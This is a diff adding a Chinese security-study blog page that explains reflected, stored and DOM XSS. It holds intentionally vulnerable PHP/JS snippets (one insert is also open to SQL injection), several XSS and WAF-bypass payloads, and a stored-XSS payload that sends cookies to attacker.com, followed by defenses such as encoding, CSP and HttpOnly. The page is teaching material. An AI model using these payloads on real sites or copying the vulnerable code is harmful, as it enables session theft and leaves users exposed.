@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"lvyatan.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12,"width":280},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null,"show_result":true},"fold":{"enable":false,"height":500},"language":false,"border_radius":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="0x00 前言XSS（跨站脚本）是 Web 安全三大经典漏洞之一，长期占 OWASP Top10 榜首区域。本文梳理三类 XSS 的本质差异、利用方式与防御要点。  仅用于合法授权环境的安全研究。  0x01 三种类型对比   类型 持久化 触发条件 危害    反射型 否 用户点击恶意链接 中（依赖诱导）   存储型 是 用户访问被注入的页面 高（自动触发）   DOM 型 否 前端 JS 渲染">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS 漏洞分类与利用笔记">
+<meta property="og:url" content="https://lvyatan.github.io/2026/06/22/XSS%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB%E4%B8%8E%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="网安学习笔记">
+<meta property="og:description" content="0x00 前言XSS（跨站脚本）是 Web 安全三大经典漏洞之一，长期占 OWASP Top10 榜首区域。本文梳理三类 XSS 的本质差异、利用方式与防御要点。  仅用于合法授权环境的安全研究。  0x01 三种类型对比   类型 持久化 触发条件 危害    反射型 否 用户点击恶意链接 中（依赖诱导）   存储型 是 用户访问被注入的页面 高（自动触发）   DOM 型 否 前端 JS 渲染">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-06-22T08:30:00.000Z">
+<meta property="article:modified_time" content="2026-09-01T10:05:42.393Z">
+<meta property="article:author" content="lvyatan">
+<meta property="article:tag" content="Web 安全">
+<meta property="article:tag" content="OWASP Top10">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://lvyatan.github.io/2026/06/22/XSS%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB%E4%B8%8E%E5%88%A9%E7%94%A8/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://lvyatan.github.io/2026/06/22/XSS%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB%E4%B8%8E%E5%88%A9%E7%94%A8/","path":"2026/06/22/XSS漏洞分类与利用/","title":"XSS 漏洞分类与利用笔记"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>XSS 漏洞分类与利用笔记 | 网安学习笔记</title>
+  
+
+
+
+
+
+
+
+
+  
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">网安学习笔记</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">网络安全学习与渗透测试实践</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B%E5%AF%B9%E6%AF%94"><span class="nav-number">2.</span> <span class="nav-text">0x01 三种类型对比</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS"><span class="nav-number">3.</span> <span class="nav-text">0x02 反射型 XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">3.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Payload-%E7%A4%BA%E4%BE%8B"><span class="nav-number">3.2.</span> <span class="nav-text">Payload 示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%AD%98%E5%82%A8%E5%9E%8B-XSS"><span class="nav-number">4.</span> <span class="nav-text">0x03 存储型 XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-1"><span class="nav-number">4.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-Payload"><span class="nav-number">4.2.</span> <span class="nav-text">攻击 Payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-DOM-%E5%9E%8B-XSS"><span class="nav-number">5.</span> <span class="nav-text">0x04 DOM 型 XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-2"><span class="nav-number">5.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%B9%E6%98%93%E5%87%BA%E9%97%AE%E9%A2%98%E7%9A%84-sink"><span class="nav-number">5.2.</span> <span class="nav-text">容易出问题的 sink</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%8D%B1%E5%AE%B3%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-number">6.</span> <span class="nav-text">0x05 危害与利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-XSS-%E5%B9%B3%E5%8F%B0-%E6%A1%86%E6%9E%B6"><span class="nav-number">7.</span> <span class="nav-text">0x06 XSS 平台&#x2F;框架</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E9%98%B2%E5%BE%A1"><span class="nav-number">8.</span> <span class="nav-text">0x07 防御</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%BE%93%E5%87%BA%E7%BC%96%E7%A0%81%EF%BC%88%E6%9C%80%E5%85%B3%E9%94%AE%EF%BC%89"><span class="nav-number">8.1.</span> <span class="nav-text">1. 输出编码（最关键）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-CSP-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5"><span class="nav-number">8.2.</span> <span class="nav-text">2. CSP 内容安全策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-HttpOnly-Cookie"><span class="nav-number">8.3.</span> <span class="nav-text">3. HttpOnly Cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E8%BE%93%E5%85%A5%E6%A0%A1%E9%AA%8C%EF%BC%88%E8%BE%85%E5%8A%A9%EF%BC%89"><span class="nav-number">8.4.</span> <span class="nav-text">4. 输入校验（辅助）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-%E7%BB%83%E4%B9%A0%E9%9D%B6%E5%9C%BA"><span class="nav-number">9.</span> <span class="nav-text">0x08 练习靶场</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-%E6%80%BB%E7%BB%93"><span class="nav-number">10.</span> <span class="nav-text">0x09 总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lvyatan"
+      src="https://avatars.githubusercontent.com/lvyatan">
+  <p class="site-author-name" itemprop="name">lvyatan</p>
+  <div class="site-description" itemprop="description">个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/lvyatan" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lvyatan" rel="noopener me" target="_blank"><i class="fa fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2427719053@qq.com" title="E-Mail → mailto:2427719053@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lvyatan.github.io/2026/06/22/XSS%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB%E4%B8%8E%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/lvyatan">
+      <meta itemprop="name" content="lvyatan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网安学习笔记">
+      <meta itemprop="description" content="个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="XSS 漏洞分类与利用笔记 | 网安学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          XSS 漏洞分类与利用笔记
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-06-22 16:30:00" itemprop="dateCreated datePublished" datetime="2026-06-22T16:30:00+08:00">2026-06-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-09-01 18:05:42" itemprop="dateModified" datetime="2026-09-01T18:05:42+08:00">2026-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web-%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">Web 渗透</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>754</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>XSS（跨站脚本）是 Web 安全三大经典漏洞之一，长期占 OWASP Top10 榜首区域。本文梳理三类 XSS 的本质差异、利用方式与防御要点。</p>
+<blockquote>
+<p>仅用于合法授权环境的安全研究。</p>
+</blockquote>
+<h2 id="0x01-三种类型对比"><a href="#0x01-三种类型对比" class="headerlink" title="0x01 三种类型对比"></a>0x01 三种类型对比</h2><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>持久化</th>
+<th>触发条件</th>
+<th>危害</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>反射型</td>
+<td>否</td>
+<td>用户点击恶意链接</td>
+<td>中（依赖诱导）</td>
+</tr>
+<tr>
+<td>存储型</td>
+<td>是</td>
+<td>用户访问被注入的页面</td>
+<td>高（自动触发）</td>
+</tr>
+<tr>
+<td>DOM 型</td>
+<td>否</td>
+<td>前端 JS 渲染污染</td>
+<td>中</td>
+</tr>
+</tbody></table>
+<h2 id="0x02-反射型-XSS"><a href="#0x02-反射型-XSS" class="headerlink" title="0x02 反射型 XSS"></a>0x02 反射型 XSS</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>输入直接被服务端回显到响应中，未做编码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;搜索：&#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;kw&#x27;</span>] . <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Payload-示例"><a href="#Payload-示例" class="headerlink" title="Payload 示例"></a>Payload 示例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://target.com/search?kw=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>绕过 WAF：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">&lt;svg/onload=alert(1)&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="title function_">atob</span>(<span class="string">&#x27;YWxlcnQoZG9jdW1lbnQuY29va2llKQ==&#x27;</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-存储型-XSS"><a href="#0x03-存储型-XSS" class="headerlink" title="0x03 存储型 XSS"></a>0x03 存储型 XSS</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>输入被存入数据库（如留言、评论），后续所有用户访问时触发。</p>
+<p>留言板示例漏洞代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$insert</span> = <span class="string">&quot;INSERT INTO comments (content) VALUES (&#x27;&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>] . <span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$insert</span>);</span><br><span class="line"><span class="comment">// 渲染时未编码</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;comment&quot;&gt;&#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;content&#x27;</span>] . <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击-Payload"><a href="#攻击-Payload" class="headerlink" title="攻击 Payload"></a>攻击 Payload</h3><p>评论区留：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;https://attacker.com/?c=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>每个访问该评论页的用户都会把 cookie 发到攻击者服务器，影响范围大。</p>
+<h2 id="0x04-DOM-型-XSS"><a href="#0x04-DOM-型-XSS" class="headerlink" title="0x04 DOM 型 XSS"></a>0x04 DOM 型 XSS</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>不经过服务端，前端 JS 直接操作 DOM 时使用未过滤的输入。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 漏洞代码</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;output&#x27;</span>).<span class="property">innerHTML</span> = location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>https://target.com/#&lt;img src=x onerror=alert(1)&gt;</code> 即可触发，服务端日志看不到。</p>
+<h3 id="容易出问题的-sink"><a href="#容易出问题的-sink" class="headerlink" title="容易出问题的 sink"></a>容易出问题的 sink</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">element.<span class="property">innerHTML</span> = userInput;     <span class="comment">// 危险</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(userInput);          <span class="comment">// 危险</span></span><br><span class="line"><span class="built_in">eval</span>(userInput);                    <span class="comment">// 危险</span></span><br><span class="line"><span class="built_in">setTimeout</span>(userInput, <span class="number">100</span>);         <span class="comment">// 危险</span></span><br><span class="line">location.<span class="property">href</span> = userInput;          <span class="comment">// 危险（javascript: 协议）</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-危害与利用"><a href="#0x05-危害与利用" class="headerlink" title="0x05 危害与利用"></a>0x05 危害与利用</h2><p>XSS 能做的远不止弹窗：</p>
+<ol>
+<li><strong>窃取 Cookie &#x2F; Session</strong>：<code>document.cookie</code></li>
+<li><strong>键盘记录</strong>：监听 <code>keydown</code> 事件</li>
+<li><strong>强制请求</strong>：伪造用户行为，例如改密码</li>
+<li><strong>内网探测</strong>：扫描内网端口、服务</li>
+<li><strong>持久化</strong>：注入 JS 后台自动修改资料维持访问</li>
+<li><strong>BeEF 框架集成</strong>：把目标 hook 到 BeEF，可远程控制浏览器</li>
+</ol>
+<h2 id="0x06-XSS-平台-框架"><a href="#0x06-XSS-平台-框架" class="headerlink" title="0x06 XSS 平台&#x2F;框架"></a>0x06 XSS 平台&#x2F;框架</h2><ul>
+<li><strong>BeEF</strong>：浏览器利用框架，可下发命令、模块化攻击</li>
+<li><strong>XSStrike</strong>：自动化 XSS 检测工具，含上下文分析</li>
+<li><strong>XSSer</strong>：批量测试工具</li>
+<li><strong>XSS-Challenge</strong>：练习靶场</li>
+</ul>
+<h2 id="0x07-防御"><a href="#0x07-防御" class="headerlink" title="0x07 防御"></a>0x07 防御</h2><h3 id="1-输出编码（最关键）"><a href="#1-输出编码（最关键）" class="headerlink" title="1. 输出编码（最关键）"></a>1. 输出编码（最关键）</h3><p>按输出位置选择编码：</p>
+<ul>
+<li>HTML 上下文：HTML 实体编码（<code>&lt;</code> → <code>&amp;lt;</code>）</li>
+<li>属性上下文：属性编码（双引号 → <code>&amp;quot;</code>）</li>
+<li>JS 上下文：JSON.stringify 或 <code>\xXX</code> 编码</li>
+<li>URL 上下文：URL 编码</li>
+</ul>
+<h3 id="2-CSP-内容安全策略"><a href="#2-CSP-内容安全策略" class="headerlink" title="2. CSP 内容安全策略"></a>2. CSP 内容安全策略</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://cdn.example.com; object-src &#x27;none&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>禁用内联脚本（需配 nonce 或 hash）</li>
+<li>白名单加载源</li>
+</ul>
+<h3 id="3-HttpOnly-Cookie"><a href="#3-HttpOnly-Cookie" class="headerlink" title="3. HttpOnly Cookie"></a>3. HttpOnly Cookie</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: SESSIONID=xxx; HttpOnly; Secure; SameSite=Strict</span><br></pre></td></tr></table></figure>
+
+<p>XSS 也拿不到 cookie。</p>
+<h3 id="4-输入校验（辅助）"><a href="#4-输入校验（辅助）" class="headerlink" title="4. 输入校验（辅助）"></a>4. 输入校验（辅助）</h3><ul>
+<li>长度限制</li>
+<li>黑&#x2F;白名单关键字符</li>
+<li>字段类型强校验（如纯数字 ID）</li>
+</ul>
+<h2 id="0x08-练习靶场"><a href="#0x08-练习靶场" class="headerlink" title="0x08 练习靶场"></a>0x08 练习靶场</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://xsser.sourceforge.net/">xsses.forEach</a></li>
+<li>DVWA 各等级 XSS 模块</li>
+<li><a target="_blank" rel="noopener" href="https://xss-game.appspot.com/">XSS Challenge by Google</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#cross-site-scripting">PortSwigger XSS Labs</a></li>
+</ul>
+<h2 id="0x09-总结"><a href="#0x09-总结" class="headerlink" title="0x09 总结"></a>0x09 总结</h2><p>XSS 不复杂，但工程化防御难。输出编码 + CSP + HttpOnly 三板斧走天下，永远不要 <code>innerHTML</code> 不可信数据。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>lvyatan
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://lvyatan.github.io/2026/06/22/XSS%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB%E4%B8%8E%E5%88%A9%E7%94%A8/" title="XSS 漏洞分类与利用笔记">https://lvyatan.github.io/2026/06/22/XSS漏洞分类与利用/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Web-%E5%AE%89%E5%85%A8/" rel="tag"># Web 安全</a>
+              <a href="/tags/OWASP-Top10/" rel="tag"># OWASP Top10</a>
+              <a href="/tags/XSS/" rel="tag"># XSS</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/06/10/BurpSuite-Intruder%E5%85%A5%E9%97%A8/" rel="prev" title="BurpSuite Intruder 入门笔记">
+                  <i class="fa fa-angle-left"></i> BurpSuite Intruder 入门笔记
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/07/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" rel="next" title="文件上传漏洞绕过技巧整理">
+                  文件上传漏洞绕过技巧整理 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-shield"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">true</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">11k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
